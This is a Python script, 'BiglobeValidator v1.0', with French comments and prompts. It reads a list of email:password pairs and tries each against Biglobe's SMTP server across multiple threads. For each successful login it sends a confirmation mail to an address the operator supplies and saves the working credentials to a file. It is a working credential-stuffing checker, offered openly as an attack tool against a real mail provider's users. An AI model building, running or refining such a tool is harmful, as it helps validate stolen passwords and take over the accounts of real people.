import smtplib
import ssl
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# === Configuration par défaut ===
THREADS = 10
SMTP_SERVER = "mail.biglobe.ne.jp"
SMTP_PORT = 587
DELAY_BETWEEN_CHECKS = 5  # secondes entre chaque tentative

# === Global state ===
valid_lock = threading.Lock()
print_lock = threading.Lock()
valid_results = []
remaining = 0


def banner():
    print(r"""
  ____  _       _ _           _           
 | __ )(_) __ _(_) | ___  ___| |_ ___ _ __ 
 |  _ \| |/ _` | | |/ _ \/ __| __/ _ \ '__|
 | |_) | | (_| | | |  __/\__ \ ||  __/ |   
 |____/|_|\__, |_|_|\___||___/\__\___|_|   
          |___/         BiglobeValidator v1.0
    """)


def send_test_mail(email, password, receiver):
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(email, password)

            message = (
                f"From: {email}\r\n"
                f"To: {receiver}\r\n"
                f"Subject: +1 BIGLOBE\r\n\r\n"
                f"Connexion SMTP réussie : {email}"
            )
            server.sendmail(email, receiver, message)
            return True

    except smtplib.SMTPAuthenticationError:
        return False

    except (smtplib.SMTPServerDisconnected, smtplib.SMTPException) as e:
        with print_lock:
            print(f"[!] Erreur SMTP ({email}): {e}")
        return False

    except Exception as e:
        with print_lock:
            print(f"[!] Erreur inconnue ({email}): {e}")
        return False


def process_combo(combo, receiver):
    global remaining

    email, password = combo.split(":", 1)
    is_valid = send_test_mail(email, password, receiver)

    with print_lock:
        status = "[VALID]" if is_valid else "[INVALID]"
        print(f"{status} {email}   | Restants : {remaining - 1}")

    if is_valid:
        with valid_lock:
            valid_results.append(combo)

    remaining -= 1
    time.sleep(DELAY_BETWEEN_CHECKS)


def load_combos(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if ":" in line]


def save_valid_results(filepath, results):
    with open(filepath, "w") as f:
        f.writelines(result + "\n" for result in results)


def main():
    global remaining

    banner()
    input_file = input("\n[?] Entrez le chemin du fichier combos (email:pass): ").strip()
    output_file = input("[?] Entrez le chemin du fichier de sortie (valide): ").strip()
    mail_test_reception = input("[?] Entrez l'email de réception du test: ").strip()

    if not os.path.isfile(input_file):
        print(f"[x] Le fichier '{input_file}' n'existe pas.")
        return

    combos = load_combos(input_file)
    remaining = len(combos)

    print(f"\n[✓] Démarrage de la vérification de {remaining} comptes...\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(process_combo, combo, mail_test_reception) for combo in combos]
        for _ in as_completed(futures):
            pass

    save_valid_results(output_file, valid_results)

    print(f"\n[✓] Terminé ! {len(valid_results)} comptes valides sauvegardés dans : {output_file}")
    print("[✓] Merci d'avoir utilisé  BiglobeValidator v1.0")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[x] S/O Sorcier 未来の日本の王 - merci d'avoir use")